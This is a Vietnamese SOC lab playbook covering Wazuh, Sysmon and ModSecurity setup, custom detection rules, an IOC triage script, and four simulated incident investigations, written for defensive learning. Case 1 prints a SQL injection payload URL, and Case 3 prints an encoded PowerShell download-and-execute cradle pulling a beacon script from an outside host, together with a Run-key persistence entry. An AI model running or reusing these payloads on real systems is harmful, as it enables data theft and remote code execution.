# 📘 NHẬT KÝ XÂY DỰNG & VẬN HÀNH DỰ ÁN MY-SOC-LAB (PROJECT PLAYBOOK)
## Toàn bộ tiến trình kỹ thuật từ con số 0 đến làm chủ hệ thống SOC Tier 1

---

## 📑 MỤC LỤC
1. [Triết lý Thiết kế & Định hình Dự án từ Con số 0](#1-triết-lý-thiết-kế--định-hình-dự-án-từ-con-số-0)
2. [Thiết lập Hạ tầng Giám sát Từng Bước (Infrastructure Setup)](#2-thiết-lập-hạ-tầng-giám-sát-từng-bước-infrastructure-setup)
   - [2.1 Khởi tạo Cụm SIEM Wazuh Central](#21-khởi-tạo-cụm-siem-wazuh-central)
   - [2.2 Cấu hình Endpoint Windows (Sysmon + Wazuh Agent)](#22-cấu-hình-endpoint-windows-sysmon--wazuh-agent)
   - [2.3 Cấu hình Web Target Linux (Nginx + ModSecurity WAF + Auth Log)](#23-cấu-hình-web-target-linux-nginx--modsecurity-waf--auth-log)
3. [Thiết kế Logic Bắt Cảnh báo trên SIEM (`local_rules.xml`)](#3-thiết-kế-logic-bắt-cảnh-báo-trên-siem-local_rulesxml)
4. [Tự động hóa Làm giàu Dữ liệu Triage (`triage_ioc_checker.py`)](#4-tự-động-hóa-làm-giàu-dữ-liệu-triage-triage_ioc_checkerpy)
5. [Quy trình Thực thi & Điều tra 4 Ca trực Điển hình](#5-quy-trình-thực-thi--điều-tra-4-ca-trực-điển-hình)
   - [Ca 1: Tấn công Web OWASP SQLi & Đối chiếu WAF (True Positive)](#ca-1-tấn-công-web-owasp-sqli--đối-chiếu-waf-true-positive)
   - [Ca 2: SSH Brute Force & Xâm nhập qua Active Response (True Positive)](#ca-2-ssh-brute-force--xâm-nhập-qua-active-response-true-positive)
   - [Ca 3: Mã hóa PowerShell & Chiếm quyền Persistence (True Positive)](#ca-3-mã-hóa-powershell--chiếm-quyền-persistence-true-positive)
   - [Ca 4: Điều tra Cảnh báo Giả & Tinh chỉnh Luật (False Positive Tuning)](#ca-4-điều-tra-cảnh-báo-giả--tinh-chỉnh-luật-false-positive-tuning)
6. [Phương pháp Kiểm thử Độc lập bằng `wazuh-logtest`](#6-phương-pháp-kiểm-thử-độc-lập-bằng-wazuh-logtest)
7. [Bí quyết Làm chủ Hệ thống & Giải trình Kỹ thuật](#7-bí-quyết-làm-chủ-hệ-thống--giải-trình-kỹ-thuật)

---

## 1. TRIẾT LÝ THIẾT KẾ & ĐỊNH HÌNH DỰ ÁN TỪ CON SỐ 0

### 1.1 Vấn đề gặp phải ban đầu
Khi bắt tay xây dựng lab giám sát an ninh mạng, rất nhiều dự án rơi vào 2 cái bẫy:
- **Bẫy 1 - Làm giao diện web mô phỏng (Mock UI):** Tự code HTML/JS rồi nạp mảng dữ liệu cảnh báo tĩnh. Điều này biến dự án thành bài tập lập trình web chứ không phải môi trường SOC thực tế.
- **Bẫy 2 - Bị ngợp bởi hạ tầng DevOps:** Cố gắng dựng cụm Kubernetes, CI/CD, Kafka, Elastic đa cụm gây quá tải tài nguyên máy tính mà không tập trung vào việc đọc log và điều tra sự cố.

### 1.2 Quyết định kiến trúc của tôi
Tôi định hình lại toàn bộ hệ thống xoay quanh **Bản chất thật của SOC Tier 1**:
- **Log Generator (Hạ tầng sinh log thật):** Chỉ cần 1 máy Windows chạy Sysmon và 1 máy Linux chạy Nginx/ModSecurity.
- **Log Collector & Processor (Thu thập & Xử lý):** Wazuh Agent đẩy log qua cổng TCP 1514 về Wazuh Manager.
- **Detection & Correlation (Luật phát hiện & Tương quan):** Viết trong `local_rules.xml` dựa trên MITRE ATT&CK.
- **Initial Triage & Automation:** Viết script Python tra cứu nhanh IOC qua API của AbuseIPDB và VirusTotal.
- **Deliverables (Sản phẩm đầu ra):** 4 bộ hồ sơ sự cố (Incident Reports) chuẩn ITSM kèm phương án xử lý ngắn hạn (Containment), dài hạn (Remediation) và kỹ thuật tinh chỉnh luật (Rule Tuning).

```
   [Windows Endpoint] ──(Sysmon / Security Logs)──┐
                                                  │
   [Linux Web Target] ──(Auth.log / ModSec CRS)───┼──► [Wazuh Manager (SIEM)] ──► [Wazuh Dashboard]
                                                  │            │
                                                  │     [Analysisd Engine]
                                                  │            │
                                                  │     [local_rules.xml]
                                                  │            │
                                                  └────► [Active Response] (Tự động drop IP)
```

---

## 2. THIẾT LẬP HẠ TẦNG GIÁM SÁT TỪNG BƯỚC (INFRASTRUCTURE SETUP)

### 2.1 Khởi tạo Cụm SIEM Wazuh Central
Tôi sử dụng Docker Compose để triển khai cụm Wazuh 4.7.2 chuẩn đơn nút (Single-Node), bao gồm:
1. `wazuh.manager`: Trái tim xử lý log, nạp decoders, đối chiếu rules và thực thi Active Response.
2. `wazuh.indexer`: Nền tảng OpenSearch lưu trữ và đánh chỉ mục (index) log sự kiện.
3. `wazuh.dashboard`: Giao diện web trực quan hóa hàng đợi cảnh báo (port 443).

**Điểm mấu chốt trong file `deployment/docker-compose.yml`:**
Tôi thiết lập ánh xạ ổ đĩa trực tiếp (Volume mount) từ file luật tùy chỉnh ngoài máy chủ vào trong container:
```yaml
volumes:
  - ../configurations/siem-rules/local_rules.xml:/var/ossec/etc/rules/local_rules.xml:ro
```
*Lợi ích:* Mỗi lần tôi chỉnh sửa luật phát hiện hoặc thêm luật loại trừ (Tuning), tôi chỉ cần khởi động lại dịch vụ quản lý bằng lệnh `docker exec -it deployment-wazuh.manager-1 /var/ossec/bin/wazuh-control restart` mà không cần build lại Docker image.

---

### 2.2 Cấu hình Endpoint Windows (Sysmon + Wazuh Agent)
Một hạn chế lớn của Windows Event Viewer mặc định là log Application/System không ghi nhận chi tiết đối số dòng lệnh hoặc hàm băm tệp. Do đó, tôi triển khai **Sysmon (System Monitor)**:

1. **Cài đặt Sysmon:**
   Sử dụng cấu hình chuẩn bảo mật từ cộng đồng tại [`configurations/windows-agent/sysmonconfig.xml`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/configurations/windows-agent/sysmonconfig.xml):
   ```cmd
   sysmon.exe -accepteula -i configurations/windows-agent/sysmonconfig.xml
   ```
2. **Cấu hình đẩy log trong [`configurations/windows-agent/ossec.conf`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/configurations/windows-agent/ossec.conf):**
   Kích hoạt đọc kênh sự kiện `Microsoft-Windows-Sysmon/Operational` và `Security`:
   ```xml
   <localfile>
     <location>Microsoft-Windows-Sysmon/Operational</location>
     <log_format>eventchannel</log_format>
   </localfile>
   <localfile>
     <location>Security</location>
     <log_format>eventchannel</log_format>
   </localfile>
   ```
*Ý nghĩa kỹ thuật:* Cung cấp trường dữ liệu `win.eventdata.commandLine` (Sysmon Event ID 1) và `win.eventdata.targetObject` (Sysmon Event ID 13).

---

### 2.3 Cấu hình Web Target Linux (Nginx + ModSecurity WAF + Auth Log)
Trên máy chủ Linux (Ubuntu/Debian), tôi tích hợp tường lửa ứng dụng web ModSecurity kèm bộ quy tắc OWASP Core Rule Set (CRS) để bảo vệ ứng dụng:

1. **Bật chế độ ghi nhận vi phạm WAF:**
   Cấu hình ModSecurity ghi nhận toàn bộ payload khả nghi vào `/var/log/modsecurity/modsec_audit.log` với chế độ `SecRuleEngine On`.
2. **Cấu hình thu thập trong [`configurations/linux-web-agent/ossec.conf`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/configurations/linux-web-agent/ossec.conf):**
   ```xml
   <!-- Thu thập log xác thực SSH để bắt brute force -->
   <localfile>
     <log_format>syslog</log_format>
     <location>/var/log/auth.log</location>
   </localfile>

   <!-- Thu thập log truy cập web để phân tích mã phản hồi HTTP -->
   <localfile>
     <log_format>apache</log_format>
     <location>/var/log/nginx/access.log</location>
   </localfile>

   <!-- Thu thập log chuyên sâu của WAF khi phát hiện tấn công OWASP -->
   <localfile>
     <log_format>apache</log_format>
     <location>/var/log/modsecurity/modsec_audit.log</location>
   </localfile>
   ```

---

## 3. THIẾT KẾ LOGIC BẮT CẢNH BÁO TRÊN SIEM (`local_rules.xml`)

Tệp [`configurations/siem-rules/local_rules.xml`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/configurations/siem-rules/local_rules.xml) chứa 4 khối luật đại diện cho 4 ca trực:

### Khối 1: Bắt tấn công SQL Injection & Đối chiếu trạng thái WAF
- **Rule 100100 (Level 10):** Kế thừa luật web cơ bản `31100`, sử dụng Regex PCRE2 quét chuỗi URI:
  ```xml
  <url type="pcre2">(?i)(\%27|\'|--|union\s+select|select\s+.*\s+from|or\s+1\=1|waitfor\s+delay)</url>
  ```
- **Rule 100101 (Level 6 - Đã ngăn chặn):** Nếu Rule 100100 kích hoạt và mã HTTP trả về là `403`, đánh dấu sự kiện là an toàn vì WAF đã chặn thành công.
- **Rule 100102 (Level 12 - Nghiêm trọng / Cảnh báo đỏ):** Nếu Rule 100100 kích hoạt nhưng mã HTTP trả về là `200`, hệ thống phát báo động khẩn cấp do payload đã vượt qua tầng phòng thủ (WAF Bypass hoặc chưa bật luật).

### Khối 2: Bắt Brute Force SSH & Tương quan Đăng nhập Thành công
- **Rule 100201 (Level 10):** Bắt hành vi dò quét mật khẩu thất bại qua SSH:
  ```xml
  <rule id="100201" level="10" frequency="5" timeframe="60">
    <if_matched_sid>5710</if_matched_sid>
    <same_source_ip />
  ```
  *Bản chất:* Nếu trong 60 giây có 5 lần phát sinh luật `5710` (SSHD failed password) từ cùng một địa chỉ IP nguồn (`same_source_ip`), nâng mức cảnh báo lên Level 10.
- **Rule 100202 (Level 13 - Critical):** Luật tương quan chuỗi (Correlation):
  Nếu xảy ra luật `5715` (SSHD accepted password) ngay sau khi IP đó vừa kích hoạt Rule `100201`, kết luận ngay: **Tài khoản đã bị chiếm quyền thành công (Account Compromised)**.

### Khối 3: Bắt Obfuscated PowerShell & Persistence Run Key
- **Rule 100301 (Level 10):** Kế thừa Sysmon Process Create `61603`, kiểm tra `originalFileName` là `powershell.exe` và `commandLine` chứa tham số che giấu:
  ```xml
  <field name="win.eventdata.commandLine" type="pcre2">(?i)\s+-(e|en|enc|encoded|encodedcommand)\s+</field>
  ```
- **Rule 100302 (Level 10):** Kế thừa Sysmon Registry Event `61613`, kiểm tra `targetObject` chứa `CurrentVersion\\Run`.

### Khối 4: Luật Tinh chỉnh Loại trừ (Rule Tuning)
- **Rule 100401 (Level 0 - Triệt tiêu cảnh báo):**
  ```xml
  <rule id="100401" level="0">
    <if_sid>100301</if_sid>
    <field name="win.eventdata.user" type="pcre2">(?i)^DOMAIN\\svc_backup$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)Backup_Routine\.ps1</field>
  ```
  *Bản chất:* Giữ nguyên khả năng bắt hacker nhưng triệt tiêu toàn bộ cảnh báo sinh ra bởi tiến trình sao lưu định kỳ hợp lệ của quản trị viên.

---

## 4. TỰ ĐỘNG HÓA LÀM GIÀU DỮ LIỆU TRIAGE (`triage_ioc_checker.py`)

Trong quá trình trực ca, khi phát hiện IP hoặc File Hash lạ, Analyst không nên thực hiện copy-paste thủ công lên từng trang web gây mất thời gian. Tôi viết công cụ dòng lệnh [`scripts/triage_ioc_checker.py`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/scripts/triage_ioc_checker.py) bằng thư viện Python chuẩn:

### Điểm đặc biệt trong kiến trúc script:
1. **Zero External Dependency:** Dùng `urllib.request` và `json`, chạy được ngay trên bất kỳ máy chủ nào mà không cần cài thêm `pip install requests`.
2. **Tự động nhận diện (Input Auto-detection):**
   - Kiểm tra Regex IPv4: `^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$`.
   - Kiểm tra độ dài và ký tự Hex của Hash: 32 (MD5), 40 (SHA1), 64 (SHA256).
3. **Cơ chế Dự phòng Mạng Cô lập (Offline Fallback):**
   Nếu biến môi trường `VT_API_KEY` hoặc `ABUSEIPDB_API_KEY` chưa được gán (hoặc máy lab không có mạng Internet), script tự động trả về phản hồi mô phỏng phân tích để đảm bảo quy trình kiểm thử không bị gián đoạn.

**Cách tôi chạy công cụ:**
```bash
python scripts/triage_ioc_checker.py -i 203.0.113.45
python scripts/triage_ioc_checker.py -f 44d88612fea8a8f36de82e1278abb02f
```

---

## 5. QUY TRÌNH THỰC THI & ĐIỀU TRA 4 CA TRỰC ĐIỂN HÌNH

### Ca 1: Tấn công Web OWASP SQLi & Đối chiếu WAF (True Positive)
1. **Kịch bản mô phỏng:** Dùng `sqlmap` hoặc trình duyệt bắn chuỗi payload:
   `GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+null%2Cuser%2Cpassword+FROM+users--+-&Submit=Submit`
2. **Quy trình tôi điều tra:**
   - Đọc tệp log mẫu [`sample-logs/case1_modsec_sqli.log`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/sample-logs/case1_modsec_sqli.log).
   - Kiểm tra mã trạng thái HTTP trên Nginx: Request mang mã `403` do ModSecurity can thiệp (Rule 942100). Tuy nhiên, request trước đó lúc 14:10:02 trả về mã `200` chứng tỏ kẻ tấn công đã từng thăm dò thành công.
3. **Kết luận & Báo cáo:** [Case-01-Report](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/incident-reports/Case-01-OWASP-SQLi-and-WAF-Triage.md). Chặn IP `198.51.100.50` tại tường lửa biên và yêu cầu đội AppSec sửa câu lệnh SQL sang Parameterized Query.

---

### Ca 2: SSH Brute Force & Xâm nhập qua Active Response (True Positive)
1. **Kịch bản mô phỏng:** Thực hiện 6 lần kết nối SSH với mật khẩu sai liên tiếp nhắm vào các tài khoản `admin`, `root`, `oracle`, `devops`, sau đó đăng nhập thành công bằng tài khoản `devops`.
2. **Quy trình tôi điều tra:**
   - Soi chiếu tệp [`sample-logs/case2_ssh_bruteforce.log`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/sample-logs/case2_ssh_bruteforce.log).
   - Phát hiện Rule `100201` kích hoạt lúc 14:20:22.
   - Thấy tiến trình `ossec-execd` thực thi lệnh: `active-response/bin/firewall-drop.sh add - 203.0.113.45 100201`.
   - **Phát hiện nghiêm trọng:** Tại giây 14:20:25, trước khi kết nối TCP bị ngắt hẳn, hệ điều hành vẫn kịp xác nhận: `Accepted password for devops from 203.0.113.45 port 41258 ssh2` (Session 42).
3. **Hành động phản ứng tức thời:**
   - Cưỡng chế ngắt toàn bộ phiên làm việc của user: `sudo pkill -KILL -u devops`.
   - Khóa tài khoản: `sudo passwd -l devops`.
   - Lập biên bản: [Case-02-Report](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/incident-reports/Case-02-SSH-BruteForce-ActiveResponse.md).

---

### Ca 3: Mã hóa PowerShell & Chiếm quyền Persistence (True Positive)
1. **Kịch bản mô phỏng:** Khởi chạy một tập lệnh PowerShell mã hóa Base64 gọi tải beacon từ máy chủ bên ngoài, đồng thời ghi khóa Registry Run Key.
2. **Quy trình tôi điều tra:**
   - Trích xuất dữ liệu JSON từ [`sample-logs/case3_sysmon_encoded_powershell.json`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/sample-logs/case3_sysmon_encoded_powershell.json).
   - Soi Sysmon Event ID 1: Bắt được chuỗi Base64:
     `SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==`
   - Giải mã Base64 sang văn bản UTF-16LE:
     `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/beacon.ps1')`
   - Soi Sysmon Event ID 13: Bắt được hành vi ghi khóa `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck` trỏ về `C:\Users\Public\update.exe`.
3. **Hành động phản ứng:** Cách ly máy trạm khỏi mạng, tiêu diệt PID 4892, xóa khóa Registry và lập biên bản: [Case-03-Report](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/incident-reports/Case-03-Windows-Encoded-PowerShell-Persistence.md).

---

### Ca 4: Điều tra Cảnh báo Giả & Tinh chỉnh Luật (False Positive Tuning)
1. **Kịch bản mô phỏng:** Tác vụ sao lưu dữ liệu tự động của hệ thống chạy PowerShell với tham số mã hóa thông báo trạng thái.
2. **Quy trình tôi điều tra:**
   - Soi log [`sample-logs/case4_sysmon_admin_false_positive.json`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/sample-logs/case4_sysmon_admin_false_positive.json).
   - Phát hiện tài khoản thực thi là `DOMAIN\svc_backup`.
   - Tiến trình cha là Windows Task Scheduler (`C:\Windows\System32\taskeng.exe`).
   - Giải mã chuỗi Base64: `Write-Host "Backup in progress"`.
   - Đối chiếu ticket quản trị: Khớp với Ticket thay đổi hệ thống `#CHG-8921`.
3. **Quyết định Tuning:** Cảnh báo là **False Positive**. Viết Rule ID `100401` với `level="0"` để triệt tiêu vĩnh viễn 48 cảnh báo giả mỗi ngày, loại trừ Alert Fatigue. Hồ sơ chi tiết tại: [Case-04-Report](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/incident-reports/Case-04-False-Positive-Alert-Tuning.md).

---

## 6. PHƯƠNG PHÁP KIỂM THỬ ĐỘC LẬP BẰNG `wazuh-logtest`

Tôi không cần duy trì liên tục nhiều máy ảo gây nặng máy. Mọi luật phát hiện đều được tôi kiểm chứng trực tiếp thông qua công cụ phân tích log nội bộ của Wazuh:

### Quy trình tôi kiểm tra:
1. Mở terminal kết nối vào container:
   ```bash
   docker exec -it deployment-wazuh.manager-1 /var/ossec/bin/wazuh-logtest
   ```
2. Dán dòng log từ file `sample-logs/case2_ssh_bruteforce.log`:
   ```text
   Oct 29 14:20:01 web-server sshd[28412]: Failed password for invalid user admin from 203.0.113.45 port 41234 ssh2
   ```
3. Quan sát kết quả phân tích theo 3 giai đoạn của Wazuh:
   - **Phase 1: Pre-decoding:** Nhận diện hostname `web-server`, chương trình `sshd`.
   - **Phase 2: Decoding:** Trích xuất `srcip: 203.0.113.45`, `dstuser: admin`.
   - **Phase 3: Rule Matching:** Khớp luật gốc `5710` (SSHD failed password). Lặp lại 5 lần sẽ kích hoạt luật `100201` của tôi.

---

## 7. BÍ QUYẾT LÀM CHỦ HỆ THỐNG & GIẢI TRÌNH KỸ THUẬT

Khi giải thích về dự án, tôi luôn tự tin làm chủ toàn bộ chi tiết nhờ nắm vững các câu trả lời cốt lõi sau:

1. **Tại sao lại dùng PowerShell UTF-16LE thay vì UTF-8 khi giải mã?**
   - *Bản chất:* Windows PowerShell được xây dựng trên .NET Framework, quy chuẩn chuỗi ký tự bên trong của PowerShell là Unicode UTF-16LE (Little Endian, mỗi ký tự chiếm 2 byte). Nếu dùng decoder UTF-8 thông thường, các ký tự sẽ bị xen kẽ các byte null (`\x00`), dẫn đến việc đọc chuỗi bị lỗi hoặc ngắt quãng.

2. **Sự khác nhau giữa việc xóa một Rule và việc đặt `level="0"` (Rule Tuning) là gì?**
   - *Bản chất:* Nếu xóa Rule mẹ (`100301`), toàn bộ hệ thống sẽ bị mù đối với kỹ thuật tấn công đó. Khi tôi đặt `level="0"` cho Rule con (`100401`) kế thừa qua `<if_sid>`, Wazuh chỉ bỏ qua cảnh báo khi thỏa mãn **đồng thời** cả tài khoản hợp lệ (`DOMAIN\svc_backup`) và tệp script hợp lệ (`Backup_Routine.ps1`). Nếu hacker tấn công dùng PowerShell mã hóa dưới quyền user khác, Rule `100301` vẫn nổ chuông cảnh báo bình thường.

3. **Luồng dữ liệu đi từ Endpoint tới Dashboard mất bao lâu?**
   - *Bản chất:* Wazuh Agent gửi log dạng stream qua kết nối TCP/1514 được mã hóa AES. Quá trình giải mã (Decoders) và so khớp luật (Analysisd) diễn ra trong bộ nhớ RAM (in-memory) mất dưới **50 mili-giây**. Khi phát hiện vi phạm, sự cố được gửi đồng thời sang `wazuh.indexer` (OpenSearch) và kích hoạt Active Response ngay lập tức.
